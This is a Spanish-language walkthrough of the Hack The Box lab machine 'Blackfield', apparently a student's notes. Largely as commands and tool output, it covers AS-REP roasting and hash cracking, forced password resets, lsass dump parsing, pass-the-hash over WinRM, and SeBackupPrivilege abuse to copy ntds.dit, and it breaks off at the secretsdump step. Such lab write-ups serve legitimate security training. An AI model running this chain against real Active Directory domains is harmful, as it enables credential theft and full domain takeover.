# Machine Blackfield

## Skills

```
SMB Enumeration
Kerberos User Enumeration (Kerbrute)
ASRepRoast Attack (GetNPUsers)
Bloodhound Enumeration
Abusing ForceChangePassword Privilege (net rpc)
Lsass Dump Analysis (Pypykatz)
Abusing WinRM
SeBackupPrivilege Exploitation
DiskShadow
Robocopy Usage
NTDS Credentials Extraction (secretsdump)

```

### Se realiza escaneo de puertos 

```
│ # Nmap 7.94SVN scan initiated Sat Jun 29 22:33:18 2024 as: nmap -sCV -p53,88,135,389,445,593,3268,5985 -oN target 10.10.10.192
   2   │ Nmap scan report for 10.10.10.192
   3   │ Host is up (0.18s latency).
   4   │
   5   │ PORT     STATE SERVICE       VERSION
   6   │ 53/tcp   open  domain        Simple DNS Plus
   7   │ 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-30 09:33:27Z)
   8   │ 135/tcp  open  msrpc         Microsoft Windows RPC
   9   │ 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
  10   │ 445/tcp  open  microsoft-ds?
  11   │ 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  12   │ 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
  13   │ 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  14   │ |_http-title: Not Found
  15   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  16   │ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
  17   │
  18   │ Host script results:
  19   │ |_clock-skew: 7h00m01s
  20   │ | smb2-security-mode:
  21   │ |   3:1:1:
  22   │ |_    Message signing enabled and required
  23   │ | smb2-time:
  24   │ |   date: 2024-06-30T09:33:40
  25   │ |_  start_date: N/A
  26   │
  27   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  28   │ # Nmap done at Sat Jun 29 22:34:19 2024 -- 1 IP address (1 host up) scanned in 61.33 seconds

```

### Puertos importantes SMB, ldp y winrm

### analice el protocolo smb para ver si podia ver algo

### Se realiza validacion con smbclient y con smbmap y se observa que tenemos acceso al recurso de profiles


```
└─# smbmap -H 10.10.10.192 -u "prueba"


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                NO ACCESS        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                NO ACCESS        Logon server share 
        profiles$                                               READ ONLY        
        SYSVOL                                                  NO ACCESS        Logon server share 

```

### consultamos el recurso y nos arroja un listado grande de usuarios, * no los puse todos debido a que son muchos

```
└─# smbmap -H 10.10.10.192 -u "prueba" -r "profiles$"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                NO ACCESS        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                NO ACCESS        Logon server share
        profiles$                                               READ ONLY
        ./profiles$
        dr--r--r--                0 Wed Jun  3 12:47:12 2020    .
        dr--r--r--                0 Wed Jun  3 12:47:12 2020    ..
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AAlleni
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABarteski
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABekesz
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABenzies
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ABiemiller
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AChampken
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ACheretei
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ACsonaki
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AHigchens
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AJaquemai
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKlado
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKoffenburger
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKollolli
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKruppe
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AKubale
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ALamerz
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AMaceldon
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AMasalunga
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ANavay
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ANesterova
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ANeusse
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AOkleshen
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    APustulka
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ARotella
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ASanwardeker
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AShadaia
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ASischo
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ASpruce
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ATakach
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ATaueg
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    ATwardowski
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    audit2020
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AWangenheim
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AWorsey
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    AZigmunt
        dr--r--r--                0 Wed Jun  3 12:47:11 2020    BBakajza

```

### Extraemos los usuarios de la siguiente forma

`└─# smbmap -H 10.10.10.192 -u "prueba" -r "profiles$" | awk 'NF{print $NF}' > ../content/users`

### Teniendo los usuarios ya podemos hacer una enumeracion con kerbrute

```
Kerbrute apunta principalmente al puerto 88/TCP, que es el puerto estándar utilizado por el servicio de autenticación Kerberos. Este es el puerto en el que los servidores Kerberos escuchan solicitudes de autenticación.
```

```
└─# kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local ./users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 07/04/24 - Ronnie Flathers @ropnop

2024/07/04 22:42:45 >  Using KDC(s):
2024/07/04 22:42:45 >   10.10.10.192:88

2024/07/04 22:43:18 >  [+] VALID USERNAME:   audit2020@BLACKFIELD.local

2024/07/04 22:45:22 >  [+] VALID USERNAME:   svc_backup@BLACKFIELD.local
2024/07/04 22:45:22 >  [+] VALID USERNAME:   support@BLACKFIELD.local
2024/07/04 22:45:49 >  Done! Tested 339 usernames (3 valid) in 183.218 seconds

```

### Teniendo los usuarios validos apartir del listado podemos usar la herramienta de impacket para solicitar a los usurios los TGTs que son vulnerables a ASREPRoast 

```
ASREPRoast es una técnica de ataque contra Active Directory (AD) que explota la configuración de Kerberos en la que algunos usuarios tienen deshabilitada la preautenticación. Este ataque permite a los atacantes obtener hashes de contraseñas cifradas, que luego pueden ser utilizados en ataques de fuerza bruta offline para intentar descifrar las contraseñas de los usuarios.

```
```
GetNPUsers.py blackfield.local/ -no-pass -usersfile validuser
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:51a11dd4d2d236f6a335b94a678795ff$2d6bdc38c9a40f5df3110b45ab231a880dc4daf5feeaaec74861c4f904756a56106f1ec01c3221871b0d30ee9894f20baaab2028944a82e8b53cd3d82b7f6c0a8d9ebaf45748e7cd24036ea86f6278ce0c233547fd52fe21819621f78346200a9601cfc89cad6b412ff2f0594e50e0438c37cf7dc81485434d17adfd7251a91bd853404edae44eb1e604273e5e1513f4d13b878b91a034491bcfa53484139b090471af757f37101fe71e30e9cfae02b48a1f5645eb8c15c27ebcaf395bd84c51bd294991c002e6acd7b2bcaf884db6cc2f80f330af1ec9ac05158159e5e91683ccaa1f1dec006b47cff1971cd27d0a9180bb7715
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

```
### como obtuvimos el hash podemos utilizar john de ripper para crakear la contraseña, se guarda el hash en un archivo.

```└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:14 DONE (2024-07-05 00:40) 0.06939g/s 994793p/s 994793c/s 994793C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### con esto ya podemos hacer pruebas de smb,crackmapexec, sin embargo de las prueba sin embargo no se encontro mucho y no se pownea

```
└─# smbmap -H 10.10.10.192 -u "support" -p "#00^BlackKnight"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        forensic                                                NO ACCESS        Forensic / Audit share.
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY        Logon server share

┌──(root㉿kali)-[/home/…/Documents/htb/blackfield/content]
└─# crackmapexec smb 10.10.10.192 -u "support" -p "#00^BlackKnight"
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

### Con la ayuda de ldapdomanindump podemos visualiar de manera grafica en html la estructura del AD.

```
nnecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/htb/blackfield/content/mapeo]
└─# ls                                                                            
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

```

### Con la ayuda de bloodhound se pudo observar que hay un usuario al que se le puede cambiar la contraseña. 

### con ldapdomaindump podemos hacer una extraer información de un Active Directory a través del protocolo LDAP Específicamente, permite realizar un volcado (dump) de los datos del dominio, proporcionando una visión completa y estructurada de la jerarquía y los objetos en el directorio.

```
──(root㉿kali)-[/home/…/blackfield/content/mapeo/mapeo2]
└─# ldapdomaindump -u 'blackfield.local\support' -p '#00^BlackKnight' 10.10.10.192
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

┌──(root㉿kali)-[/home/…/blackfield/content/mapeo/mapeo2]
└─# ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

```
### podermos ver los archivos html publicando un servidor con python y pero es mejor con bloodhound ps nos da recomendaciones para atacar el AS, para iniciarlo, primero tenermos que iniciar `neo4j`

```
└─# neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2024-07-06 16:28:26.752+0000 INFO  Starting...
2024-07-06 16:28:37.957+0000 INFO  This instance is ServerId{1fd7c48e} (1fd7c48e-8f7d-4d4d-84ad-6ca0379cb622)
2024-07-06 16:28:40.561+0000 INFO  ======== Neo4j 4.4.26 ========
2024-07-06 16:28:42.932+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2024-07-06 16:28:42.933+0000 INFO  Updating the initial password in component 'security-users'
2024-07-06 16:28:45.581+0000 INFO  Bolt enabled on localhost:7687.
2024-07-06 16:28:49.301+0000 INFO  Remote interface available at http://localhost:7474/
2024-07-06 16:28:49.357+0000 INFO  id: 1F101480ABD8EB68B212AC1D13C7385E22B7410C574FD155561F63A81EED54BB
2024-07-06 16:28:49.357+0000 INFO  name: system
2024-07-06 16:28:49.358+0000 INFO  creationDate: 2024-03-12T02:26:03.496Z
2024-07-06 16:28:49.358+0000 INFO  Started.



└─# bloodhound &>/dev/null &
[1] 190340

┌──(root㉿kali)-[~]
└─# disown


```

### Luego de iniciar el bloodhound hacemos lanzamos el bllodhound-python que tiene un script para generar un archivp para poder verlo en bllodhound.

```
└─# bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: DC01.BLACKFIELD.local
WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Done in 00M 42S


┌──(root㉿kali)-[/home/…/htb/blackfield/content/bloodhound]
└─# ls
20240704093703_computers.json   20240704093703_gpos.json    20240704093703_users.json       20240706125829_domains.json  20240706125829_ous.json
20240704093703_containers.json  20240704093703_groups.json  20240706125829_computers.json   20240706125829_gpos.json     20240706125829_users.json
20240704093703_domains.json     20240704093703_ous.json     2024070

```

### en la opcion de bloohound cargamos los archivos, despues de analizar cada opcion bloodhound nos muestra que podemos cambiar las credenciales de un usuario

```
SUPPORT@BLACKFIELD.LOCAL tiene la capacidad de cambiar la contraseña del usuario AUDIT2020@BLACKFIELD.LOCAL sin conocer la contraseña actual de ese usuario.
```

###  sabiendo que podemos cambiar las credenciales de audit2020, podemos usar net rpc para cambiar la credencial

```
─# net rpc password audit2020 -U 'support' -S 10.10.10.192
Enter new password for audit2020:
Password for [WORKGROUP\support]:

```
### Habiendo cambiado el pass del usuario, y sabiendo que tenemos el puerto abierto de winrm podemos utilizar la herramienta winrm para acceder por consola, antes revisar si tenemos un pwned con crackmapexec si nos da un pwned

### como no tenemos pwned validamos por smb que archivos se pueden consultar


```
─# smbmap -H 10.10.10.192 -u "audit2020" -p 'test2020$' -r profiles$ -r 'forensic/memory_analysis'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        ./forensicmemory_analysis
        dr--r--r--                0 Thu May 28 16:29:24 2020    .
        dr--r--r--                0 Thu May 28 16:29:24 2020    ..
        fr--r--r--         37876530 Thu May 28 16:29:24 2020    conhost.zip
        fr--r--r--         24962333 Thu May 28 16:29:24 2020    ctfmon.zip
        fr--r--r--         23993305 Thu May 28 16:29:24 2020    dfsrs.zip
        fr--r--r--         18366396 Thu May 28 16:29:24 2020    dllhost.zip
        fr--r--r--          8810157 Thu May 28 16:29:24 2020    ismserv.zip
        fr--r--r--         41936098 Thu May 28 16:29:24 2020    lsass.zip
        fr--r--r--         64288607 Thu May 28 16:29:24 2020    mmc.zip
        fr--r--r--         13332174 Thu May 28 16:29:24 2020    RuntimeBroker.zip
        fr--r--r--        131983313 Thu May 28 16:29:24 2020    ServerManager.zip
        fr--r--r--         33141744 Thu May 28 16:29:24 2020    sihost.zip
        fr--r--r--         33756344 Thu May 28 16:29:24 2020    smartscreen.zip
        fr--r--r--         14408833 Thu May 28 16:29:24 2020    svchost.zip
        fr--r--r--         34631412 Thu May 28 16:29:24 2020    taskhostw.zip
        fr--r--r--         14255089 Thu May 28 16:29:24 2020    winlogon.zip
        fr--r--r--          4067425 Thu May 28 16:29:24 2020    wlms.zip
        fr--r--r--         18303252 Thu May 28 16:29:24 2020    WmiPrvSE.zip
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share

```

### Podemos descargar el lsass para dumpearlo
```
─# smbmap -H 10.10.10.192 -u "audit2020" -p 'test2020$' --download forensic/memory_analysis/lsass.zip

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[+] Starting download: forensic\memory_analysis\lsass.zip (41936098 bytes)
[+] File output to: /home/kali/Documents/htb/blackfield/content/lsass/10.10.10.192-forensic_memory_analysis_lsass.zip

```

### dumpeamos el lsass

```┌──(root㉿kali)-[/home/…/htb/blackfield/content/lsass]
└─# file lsass.DMP 
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/htb/blackfield/content/lsass]
└─# pypykatz lsa minidump lsass.DMP 
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
```
### No relacione todoo el dump porque es muy grande

### pero con el hash ahora buscamos nuestro hash de los usuarios que habiamos validado y podemos probar con crackmapexec si nos pwnea 


```
┌──(root㉿kali)-[/home/…/htb/blackfield/content/lsass]
└─# crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)

```

###Capturamos la flag de usuario

```
└─# evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup

```

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Documents> system info
The term 'system' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ system info
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (system:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
    ProductName    REG_SZ    Windows Server 2019 Standard

```

### Podemos abusar del privilegio `SeBackupPrivilege` hacemos una consulta en google con la palabra abuse de este prilegio y nos sale mucha información.

### en un principio vamos a subir un script para poder hacer un bk de la sam 

### Script
![]https://pentestlab.blog/tag/diskshadow/

### Se crea el archivo con el script en el equipo atacante y despues se sube con ayuda de evilwinrm coloco caracter adicional porque cuando lo ejecuto me borra el ultimo caracter

```
set context persistent nowriterss
add volume c: alias elfojhonn
createe
expose %elfojhon% z::
```
### Lanzamos el comando con ayuda de diskshadow

```
*Evil-WinRM* PS C:\tmp> diskshadow.exe /s .\sc.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/6/2024 7:34:21 PM

-> set context persistent nowriters
-> add volume c: alias elfojhon
-> create
Alias elfojhon for shadow ID {553308d3-35bb-430d-b630-a83d9b830771} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {8c783008-2640-4d9c-8f4b-4a8a9a9b87be} set as environment variable.

Querying all shadow copies with the shadow copy set ID {8c783008-2640-4d9c-8f4b-4a8a9a9b87be}

        * Shadow copy ID = {553308d3-35bb-430d-b630-a83d9b830771}               %elfojhon%
                - Shadow copy set: {8c783008-2640-4d9c-8f4b-4a8a9a9b87be}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/6/2024 7:34:23 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %elfojhon% z:
-> %elfojhon% = {553308d3-35bb-430d-b630-a83d9b830771}
The shadow copy was successfully exposed as z:\.
->

```

### Habiendo creadoe el bk podemos ir a consultar el arcvhivo ntds.dit

```
*Evil-WinRM* PS C:\tmp> robocopy /b z:\windows\NTDS\ . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, July 6, 2024 7:48:30 PM
   Source : z:\windows\NTDS\
     Dest : C:\tmp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\NTDS\
            New File              18.0 m        ntds.dit
  0.0%
  0.3%

 99.3%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           111025694 Bytes/sec.
   Speed :            6352.941 MegaBytes/min.
   Ended : Saturday, July 6, 2024 7:48:30 PM

*Evil-WinRM* PS C:\tmp> dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/6/2024   7:34 PM            611 2024-07-06_19-34-23_DC01.cab
-a----         7/6/2024   4:07 PM       18874368 ntds.dit
-a----         7/6/2024   7:30 PM             94 sc.txt



```
```

Info: Downloading C:\tmp\ntds.dit to ntds.dit

Info: Download successful!

```
### Importante tambien debemos descargar el archivo system de la ruta de regitro

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\system system_
The operation completed successfully.

```
```
reg save HKLM\system system_:

reg save es un comando de PowerShell que se utiliza para guardar una copia de una subclave del registro en un archivo.
HKLM\system especifica la subclave del registro que se va a guardar. En este caso, se refiere a la subclave SYSTEM dentro del HKEY_LOCAL_MACHINE (HKLM), que contiene configuraciones críticas del sistema operativo.
system_ es el nombre del archivo donde se guardará la copia de la subclave del registro. Este archivo se creará en el directorio actual, que es C:\Users\svc_backup\Documents.
```

### con impacket dumpeamos los archivo ntds.dit y con el system del registor

```
─# impacket-secretsdump -system system_ -ntds ntds.dit LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
